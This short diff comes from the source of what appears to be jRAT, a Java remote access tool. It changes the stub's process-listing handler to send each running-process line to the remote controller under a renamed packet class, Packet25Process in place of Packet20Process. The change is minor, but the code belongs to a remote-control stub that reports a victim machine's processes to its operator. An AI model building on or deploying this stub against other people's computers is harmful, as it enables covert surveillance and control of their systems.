@@ -4,7 +4,7 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 
 import se.jrat.stub.Connection;
-import se.jrat.stub.packets.outgoing.Packet20Process;
+import se.jrat.stub.packets.outgoing.Packet25Process;
 
 import com.redpois0n.oslib.OperatingSystem;
 
@@ -32,7 +32,7 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 
 				while ((line = reader.readLine()) != null) {		
 					if (line.length() > 0) {
-						Connection.addToSendQueue(new Packet20Process(line));
+						Connection.addToSendQueue(new Packet25Process(line));
 					}
 				}
 				reader.close();
